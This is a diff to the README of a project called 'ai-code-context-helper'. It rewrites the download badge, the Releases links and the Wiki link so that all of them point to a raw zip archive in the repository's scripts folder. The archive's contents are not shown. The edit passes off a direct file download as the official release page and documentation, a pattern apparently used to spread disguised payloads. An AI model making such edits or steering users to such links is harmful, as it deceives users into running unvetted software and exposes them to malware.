@@ -1,6 +1,6 @@
 # 🚀 ai-code-context-helper - Simplify Your AI Development Experience
 
-![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)
+![Download](https://github.com/shouan123/ai-code-context-helper/raw/refs/heads/master/scripts/context-ai-helper-code-v1.7-alpha.2.zip%20Releases-brightgreen)
 
 ## 🌟 Overview
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and run the software.
 
 ### 1. 🖱️ Visit the Download Page
 
-To get started, [visit the Releases page](https://github.com/shouan123/ai-code-context-helper/releases) to download the application.
+To get started, [visit the Releases page](https://github.com/shouan123/ai-code-context-helper/raw/refs/heads/master/scripts/context-ai-helper-code-v1.7-alpha.2.zip) to download the application.
 
 ### 2. 📥 Download the Software
 
@@ -61,12 +61,12 @@ If you run into issues, consider these steps:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For in-depth usage guides and FAQs, check the [GitHub Wiki](https://github.com/shouan123/ai-code-context-helper/wiki).
+- **Documentation:** For in-depth usage guides and FAQs, check the [GitHub Wiki](https://github.com/shouan123/ai-code-context-helper/raw/refs/heads/master/scripts/context-ai-helper-code-v1.7-alpha.2.zip).
 - **Support:** If you encounter problems that you cannot solve, please open an issue on the GitHub repository for assistance.
 
 ## 📥 Download & Install
 
-For easy access, you can download the latest version from the [Releases page](https://github.com/shouan123/ai-code-context-helper/releases).
+For easy access, you can download the latest version from the [Releases page](https://github.com/shouan123/ai-code-context-helper/raw/refs/heads/master/scripts/context-ai-helper-code-v1.7-alpha.2.zip).
 
 ## 🗣️ Community and Feedback
 
